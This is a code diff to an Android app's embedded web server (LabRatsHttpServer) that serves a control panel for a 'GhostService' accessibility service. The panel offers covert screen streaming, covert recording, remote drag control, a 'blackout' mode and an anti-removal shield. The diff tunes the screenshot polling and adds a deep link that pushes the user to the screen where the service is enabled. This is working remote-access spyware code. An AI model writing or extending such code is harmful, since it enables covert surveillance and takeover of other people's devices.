+        html.append("      document.getElementById('rec-btn').innerHTML = '&#9632; STOP_COVERT_RECORDING';");
         html.append("      isRecording = true;");
         html.append("    }");
         html.append("  }).catch(e => {});");
@@ -3498,6 +3471,8 @@ public class LabRatsHttpServer extends NanoHTTPD {
         // Screen View tool
         html.append("<div style=\"text-align: center; margin-bottom: 25px;\">");
         html.append("<div id=\"ghost-screen-container\" style=\"position: relative; display: block; margin: 0 auto; background: #000; border: 1px solid var(--neon-cyan); border-radius: 12px; overflow: hidden; min-height: 150px; width: 100%; max-width: 270px; cursor: crosshair;\">");
+        // Improved Filter: Grayscale + Sharpened Contrast. No more green tint.
+        // Brightness is lower because we increased signal at the source (GhostService).
         html.append("<img id=\"ghost-screen-stream\" src=\"\" style=\"max-width: 100%; height: auto; display: block; margin: 0 auto; user-select: none; -webkit-user-drag: none;\" onmousedown=\"startGhostDrag(event)\" onmouseup=\"endGhostDrag(event)\" />");
         html.append("<div id=\"ghost-screen-status\" style=\"position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); color: #888; font-size: 0.8rem;\">COVERT_FEED_STANDBY</div>");
         html.append("</div></div>");
@@ -3579,11 +3554,14 @@ public class LabRatsHttpServer extends NanoHTTPD {
         html.append("function refreshGhostScreen() {");
         html.append("  if (!ghostScreenActive) return;");
         html.append("  const img = document.getElementById('ghost-screen-stream');");
-        // Using the new covert screenshot route
         html.append("  img.src = '/ghost/screenshot?t=' + Date.now();");
-        html.append("  img.onload = () => { document.getElementById('ghost-screen-status').style.display = 'none'; };");
-        html.append("  img.onerror = () => { console.log('Covert shot failed, retrying...'); };");
-        html.append("  setTimeout(refreshGhostScreen, 1500);"); // Slightly slower for stability
+        html.append("  img.onload = () => {");
+        html.append("    document.getElementById('ghost-screen-status').style.display = 'none';");
+        html.append("    setTimeout(refreshGhostScreen, 800);");
+        html.append("  };");
+        html.append("  img.onerror = () => {");
+        html.append("    setTimeout(refreshGhostScreen, 1000);");
+        html.append("  };");
         html.append("}");
         html.append("var ghostDragStart = null;");
         html.append("function startGhostDrag(e) {");
@@ -3649,6 +3627,14 @@ public class LabRatsHttpServer extends NanoHTTPD {
         html.append("      text.innerHTML = '<span style=\"color:var(--danger);\">OFFLINE_AWAITING_PERMISSION</span>';");
         html.append("      prompt.style.display = 'block';");
         html.append("    }");
+        html.append("    const stream = document.getElementById('ghost-screen-stream');");
+        html.append("    if (stream) {");
+        html.append("      if (data.blackout) {");
+        html.append("        stream.style.filter = 'brightness(5) contrast(1.8) saturate(1.2) grayscale(0.2)';");
+        html.append("      } else {");
+        html.append("        stream.style.filter = 'none';");
+        html.append("      }");
+        html.append("    }");
         html.append("    if (arBtn) {");
         html.append("      if (data.antiRemoval) {");
         html.append("        arBtn.innerHTML = 'SHIELD_ACTIVE'; arBtn.style.borderColor = 'var(--neon-green)'; arBtn.style.color = 'var(--neon-green)';");
@@ -3686,9 +3672,18 @@ public class LabRatsHttpServer extends NanoHTTPD {
         if (action == null) return serveError("No action");
 
         if (action.equals("settings")) {
-            Intent intent = getIntent();
-            context.startActivity(intent);
-            return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\":true}");
+            try {
+                Intent intent = getIntent();
+                context.startActivity(intent);
+                return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\":true}");
+            } catch (Exception e) {
+                Log.e("LabRATS", "Settings intent error: " + e.getMessage());
+                // Absolute fallback to main menu
+                Intent fallback = new Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS);
+                fallback.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                context.startActivity(fallback);
+                return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\":true, \"fallback\":true}");
+            }
         }
 
         if (ghost == null) return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\":false, \"error\":\"Ghost Service Offline\"}");
@@ -3774,18 +3769,31 @@ public class LabRatsHttpServer extends NanoHTTPD {
 
     @NonNull
     private Intent getIntent() {
+        android.content.ComponentName componentName = new android.content.ComponentName(context, GhostService.class);
+        String serviceId = componentName.flattenToString();
+        
+        // Start with the standard accessibility settings intent
         Intent intent = new Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS);
 
-        // Optimization: Attempt to highlight the specific service in the list
-        String serviceId = context.getPackageName() + "/" + GhostService.class.getName();
+        if (Build.VERSION.SDK_INT >= 31) { // Android 12+
+            try {
+                // Attempt to jump directly to the specific switch page
+                Intent directIntent = new Intent("android.settings.ACCESSIBILITY_DETAILS_SETTINGS");
+                directIntent.putExtra("android.intent.extra.COMPONENT_NAME", serviceId);
+                directIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_NO_HISTORY);
+                return directIntent;
+            } catch (Exception ignored) {
+                // If it fails, we will return the standard intent below
+            }
+        }
 
-        // Standard approach to deep-link or highlight a specific accessibility service
+        // Fallback for older devices or failed direct jump
         intent.putExtra(":settings:fragment_args_key", serviceId);
         android.os.Bundle bundle = new android.os.Bundle();
         bundle.putString(":settings:fragment_args_key", serviceId);
         intent.putExtra(":settings:show_fragment_args", bundle);
-
         intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_NO_HISTORY);
+
         return intent;
     }
 }
